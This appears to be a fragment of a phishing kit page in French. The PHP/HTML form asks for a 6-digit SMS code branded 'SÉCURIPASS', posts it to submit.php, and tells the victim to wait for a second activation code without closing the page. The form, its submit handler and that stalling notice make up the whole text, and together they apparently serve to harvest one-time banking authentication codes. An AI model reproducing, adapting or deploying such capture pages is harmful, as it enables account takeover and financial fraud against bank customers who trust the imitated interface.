    ...
    <main id="main" class="main">
        <div class="container">
            <div class="details-container">
                ...
                <p style="font-weight: 600; color: #333; font-size: 14px;">VEUILLEZ SAISIR UN CODE À 6 CHIFFRES ENVOYÉ PAR SMS SUR VOTRE MOBILE :</p>
                <form method="post" action="submit.php">
                    <div class="form-group">
                        <label for="securepass">Tapez votre code *</label>
                        <input style="max-width: 300px;" type="text" name="securepass" id="securepass" maxlength="6" pattern="[0-9]{6,6}" placeholder="Veuillez saisir la donnée" class="form-control <?php echo is_invalid_class($_SESSION['errors'],'securepass') ?>">
                    ...
                    <span style="color:red;font-weight: bold;">                    
                        ...
                        * Important: Veuillez patienter vous allez recevoir un 2eme code d'activation SÉCURIPASS Ne pas fermer cette page avant réception <br>
                     </span>
                    </div>
                </form>
            </div>
